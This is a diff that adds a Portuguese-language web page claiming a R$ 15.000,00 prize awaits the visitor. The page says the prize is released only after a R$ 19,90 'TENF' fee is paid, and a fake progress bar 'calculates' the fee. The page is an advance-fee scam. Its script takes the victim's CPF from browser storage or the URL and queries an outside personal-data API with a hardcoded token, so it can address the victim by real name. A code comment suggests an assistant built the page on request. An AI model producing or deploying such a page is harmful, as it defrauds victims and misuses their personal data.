@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Premiação</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, Helvetica, sans-serif;
+            background: #f3f3f3;
+        }
+
+        header {
+            background: #2a4db6;
+            padding: 20px;
+            color: #fff;
+            display: flex;
+            align-items: center;
+        }
+
+        header img {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            margin-right: 14px;
+        }
+
+        header h1 {
+            font-size: 18px;
+            margin: 0;
+        }
+
+        .container {
+            max-width: 1000px;
+            margin: 20px auto;
+            background: #fff;
+            padding: 20px;
+            border-radius: 10px;
+        }
+
+        .alerta {
+            background: #f39200;
+            padding: 15px;
+            border-radius: 6px;
+            color: #fff;
+            margin-bottom: 12px;
+        }
+
+        .pendencia {
+            background: #e8f3ff;
+            padding: 15px;
+            border-radius: 6px;
+            color: #222;
+            margin-bottom: 14px;
+        }
+
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 15px;
+            text-align: center;
+            font-size: 18px;
+            border-radius: 8px;
+            text-decoration: none;
+            color: #fff;
+            cursor: pointer;
+            border: none;
+        }
+
+        .btn-azul {
+            background: #2a4db6;
+        }
+
+        .btn-verde {
+            background: #0dbf3a;
+        }
+
+        .progress-wrap {
+            width: 80%;
+            margin: 18px auto;
+            height: 8px;
+            background: #ddd;
+            border-radius: 6px;
+            overflow: hidden;
+        }
+
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: #2a4db6;
+            transition: width 0.1s linear;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        /* small responsiveness */
+        @media (max-width:600px) {
+            .container {
+                margin: 10px;
+                border-radius: 8px;
+                padding: 16px
+            }
+
+            header h1 {
+                font-size: 16px
+            }
+
+            .btn {
+                font-size: 16px
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- HEADER -->
+    <header>
+        <img src="https://cdn-icons-png.flaticon.com/512/149/149071.png" alt="avatar">
+        <h1 id="saudacao">Olá, Visitante</h1>
+    </header>
+
+    <!-- TELA 1: PENDÊNCIA -->
+    <div class="container" id="tela1">
+        <h2>Premiação disponível</h2>
+        <h1 style="color:#000; margin-top:6px;">R$ 15.000,00</h1>
+
+        <div class="alerta">
+            Atenção! <b id="nomeAviso">Visitante</b>, leia a mensagem abaixo para liberar sua Premiação
+        </div>
+
+        <div class="pendencia">
+            <b>Pendência encontrada!</b><br>
+      Para você receber o seu valor, é obrigatório realizar o pagamento do <b>TENF (Taxa de Emissão de Nota Fiscal)</b>.
+            O valor dessa taxa será calculado ao clicar no botão.
+        </div>
+
+        <button class="btn btn-azul" id="btnCalcular">Calcular TAXA</button>
+    </div>
+
+    <!-- TELA 2: CARREGANDO -->
+    <div class="container hidden" id="tela2">
+        <h2 id="saudacao2">Olá, Visitante</h2>
+
+        <div class="progress-wrap" aria-hidden="true">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+
+        <p id="statusText">Calculando sua Taxa TENF...</p>
+    </div>
+
+    <!-- TELA 3: TAXA CALCULADA -->
+    <div class="container hidden" id="tela3">
+        <h2 id="saudacao3">Olá, Visitante</h2>
+
+        <div class="pendencia" style="text-align:center; font-size:20px;">
+            <b>TENF (Taxa de Emissão de Nota Fiscal)</b><br>
+            <span style="font-size:22px; font-weight:700;">R$ 19,90</span>
+        </div>
+
+        <p>Para você receber o seu valor, é obrigatório realizar o pagamento do TENF. Após o pagamento, a transferência
+            será feita para sua chave PIX cadastrada.</p>
+
+        <!-- botão apontando para o link fixo (colocado google.com conforme você pediu) -->
+        <a id="payLink" class="btn btn-verde" href="https://google.com" target="_blank" rel="noopener">Efetuar o
+            pagamento</a>
+    </div>
+
+    <script>
+        /*
+  Fluxo de busca de dados:
+  1) verifica sessionStorage.dadosUsuario (preferência)
+  2) verifica localStorage.dadosUsuario ou localStorage.userData
+  3) verifica query params: cpf, document, documento
+  4) se encontra cpf, chama a API para buscar dados e salva em sessionStorage.dadosUsuario
+  5) se tudo falhar, mostra "Visitante"
+*/
+
+/* ====== CONFIGURAÇÕES ====== */
+// Troque aqui se precisar (URL/token da sua API)
+const API_BASE = "https://bk.elaitech.pro/consultar-filtrada/cpf?cpf=";
+const API_TOKEN = "927492e7841e779b2d605b6309d11c5a463b6c2b89a8fb692cc0496928c5171f";
+// timeout de requisição (ms)
+const FETCH_TIMEOUT = 6000;
+
+/* ====== HELPERS ====== */
+function safeParseJSON(s) {
+  try { return JSON.parse(s); } catch(e){ return null; }
+}
+function getQueryParam(name){
+  const p = new URLSearchParams(window.location.search);
+  return p.get(name) || p.get(name.toLowerCase());
+}
+function formatCPF(cpf){
+  if(!cpf) return "";
+  const clean = cpf.replace(/\D/g,'');
+  if(clean.length!==11) return cpf;
+  return clean.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,'$1.$2.$3-$4');
+}
+
+/* ====== BUSCAR CPF/NOME DE FONTES LOCAIS ====== */
+function getCpfFromStorages(){
+  // 1) sessionStorage.dadosUsuario
+  const s1 = safeParseJSON(sessionStorage.getItem('dadosUsuario'));
+  if(s1 && s1.cpf) return s1.cpf;
+
+  // 2) localStorage.dadosUsuario
+  const l1 = safeParseJSON(localStorage.getItem('dadosUsuario'));
+  if(l1 && l1.cpf) return l1.cpf;
+
+  // 3) localStorage.userData (algumas versões do seu fluxo já usaram essa chave)
+  const l2 = safeParseJSON(localStorage.getItem('userData'));
+  if(l2 && l2.cpf) return l2.cpf;
+
+  // 4) outras chaves possíveis
+  const l3 = safeParseJSON(localStorage.getItem('user'));
+  if(l3 && l3.cpf) return l3.cpf;
+
+  // 5) query params
+  const q = getQueryParam('cpf') || getQueryParam('document') || getQueryParam('documento') || getQueryParam('doc');
+  if(q) return q;
+
+  // nada encontrado
+  return null;
+}
+
+/* ====== CHAMADA À API (com timeout) ====== */
+async function fetchUserFromApi(cpf){
+  if(!cpf) throw new Error("CPF inválido");
+  const url = `${API_BASE}${encodeURIComponent(cpf)}&token=${API_TOKEN}`;
+  const controller = new AbortController();
+  const to = setTimeout(()=>controller.abort(), FETCH_TIMEOUT);
+
+  try {
+    const res = await fetch(url, { signal: controller.signal });
+    clearTimeout(to);
+    if(!res.ok) throw new Error('status:'+res.status);
+    const json = await res.json();
+    // diferentes respostas possíveis: {cpf,nome,...} ou {success:true,data:{nome:...}}
+    if(json && json.nome) return { nome: json.nome, cpf: json.cpf || cpf, raw: json };
+    if(json && json.data && json.data.nome) return { nome: json.data.nome, cpf: json.data.cpf || cpf, raw: json.data };
+    // fallback: try to extract some name-like field
+    return { nome: json.nome || json.data?.nome || null, cpf, raw: json };
+  } catch (err){
+    clearTimeout(to);
+    console.warn("Erro ao chamar API:", err);
+    throw err;
+  }
+}
+
+/* ====== Função principal para obter o nome (tenta várias fontes, chama API se possível) ====== */
+async function obtainUserName(){
+  // 1) sessionStorage
+  const s = safeParseJSON(sessionStorage.getItem('dadosUsuario'));
+  if(s && s.nome) return s;
+
+  // 2) localStorage
+  const l = safeParseJSON(localStorage.getItem('dadosUsuario')) || safeParseJSON(localStorage.getItem('userData'));
+  if(l && l.nome) {
+    // também salva em sessionStorage para prioridade e proteção
+    sessionStorage.setItem('dadosUsuario', JSON.stringify(l));
+    return l;
+  }
+
+  // 3) tenta pegar cpf de fontes locais / url
+  const cpf = getCpfFromStorages();
+  if(!cpf) return { nome: "Visitante" };
+
+  // 4) chama API
+  try {
+    const apiRes = await fetchUserFromApi(cpf);
+    const final = { nome: apiRes.nome || "Visitante", cpf: apiRes.cpf || cpf };
+    // salva em sessionStorage (escopo aba) para não ser afetado por scripts
+    try { sessionStorage.setItem('dadosUsuario', JSON.stringify(final)); } catch(e) { /* ignore */ }
+    return final;
+  } catch(e){
+    // falha na API: cai para Visitante ou para nome gravado em localStorage
+    return { nome: (l && l.nome) ? l.nome : "Visitante" , cpf: cpf };
+  }
+}
+
+/* ====== UI helpers ====== */
+function applyNameToUI(nome){
+  const primeiro = (nome || "Visitante").trim().split(" ")[0] || "Visitante";
+  const full = nome || "Visitante";
+  const sEls = document.querySelectorAll('#saudacao, #saudacao2, #saudacao3');
+  sEls.forEach(el => { if(el) el.textContent = `Olá, ${primeiro}`; });
+  const aviso = document.getElementById('nomeAviso');
+  if(aviso) aviso.textContent = full;
+}
+
+/* ====== Progress animation (fills over 6s) ====== */
+function startProgressBar(durationMs = 6000){
+  const bar = document.getElementById('progressBar');
+  if(!bar) return;
+  bar.style.transition = `width ${durationMs}ms linear`;
+  // trigger reflow
+  void bar.offsetWidth;
+  bar.style.width = '100%';
+}
+
+/* ====== Inicialização e eventos ====== */
+document.addEventListener('DOMContentLoaded', async () => {
+  // 1) obtém e aplica nome (tentativa automática)
+  const user = await obtainUserName();
+  applyNameToUI(user.nome);
+
+  // 2) habilita botão
+  const btn = document.getElementById('btnCalcular');
+  btn.addEventListener('click', () => {
+    // mostra tela 2
+    document.getElementById('tela1').classList.add('hidden');
+    document.getElementById('tela2').classList.remove('hidden');
+
+    // anima progress
+    startProgressBar(6000);
+
+    // após 6s mostra tela3
+    setTimeout(() => {
+      document.getElementById('tela2').classList.add('hidden');
+      document.getElementById('tela3').classList.remove('hidden');
+      // garante que a saudação na tela final esteja atualizada
+      const sname = safeParseJSON(sessionStorage.getItem('dadosUsuario')) || safeParseJSON(localStorage.getItem('dadosUsuario'));
+      applyNameToUI(sname?.nome || user.nome || 'Visitante');
+    }, 6000);
+  });
+});
+    </script>
+
+</body>
+
+</html>
